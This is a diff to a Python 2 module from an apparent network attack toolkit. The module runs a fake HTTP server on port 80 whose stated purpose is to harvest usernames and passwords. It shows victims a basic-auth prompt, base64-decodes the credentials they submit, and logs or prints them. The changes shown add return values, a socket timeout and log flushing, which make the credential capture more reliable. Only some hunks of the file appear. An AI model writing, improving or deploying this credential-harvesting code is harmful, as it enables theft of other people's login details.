@@ -8,7 +8,7 @@ from threading import Thread
 # Emulate an HTTP server.  If no default page is entered, a auth realm will be presented instead.
 # This can be used to harvest usernames/passwords from users not paying any attention.
 #
-
+__name__='HTTP Server'
 class HTTPService(Service):
 	def __init__(self):
 		self.server = 'B4114stS3c HTTP Server v3.1'
@@ -25,17 +25,18 @@ class HTTPService(Service):
 			self.root = raw_input('[+] Enter root file: ')
 		except Exception, j:
 			util.Error('Error with root; %s'%j)
-			return
+			return False
 		util.Msg('Running HTTP server')
 		http_thread = Thread(target=self.initialize)
 		http_thread.start()
-		return
+		return True
 
 	def initialize(self):
 		self.httpd = BaseHTTPServer.HTTPServer(('', 80), self.handler)
 		self.running = True
 		
 		try:
+			self.httpd.socket.settimeout(5)
 			while self.running:
 				self.httpd.handle_request()
 		except KeyboardInterrupt:
@@ -56,7 +57,7 @@ class HTTPService(Service):
 				'log_file' : self.log_file
 				  }
 		RequestHandler(context, *args)
-	
+		
 #
 # handle HTTP requests; just HEAD/GET right now.  POST if needed be.
 #
@@ -108,6 +109,7 @@ class RequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
 			elif not auth_header is None:
 				if self.context['log_data']:
 					self.context['log_file'].write(base64.b64decode(auth_header.split(' ')[1]) + '\n')
+					self.context['log_file'].flush()
 				if self.context['dump']:
 					util.Msg('Collected: %s'%base64.b64decode(auth_header.split(' ')[1]))
 				self.send_auth_headers()
@@ -133,3 +135,4 @@ class RequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
 				print self.address_string() + tmp
 			if self.context['log_data']:
 				self.context['log_file'].write(self.address_string() + tmp + '\n')
+				self.context['log_file'].flush()
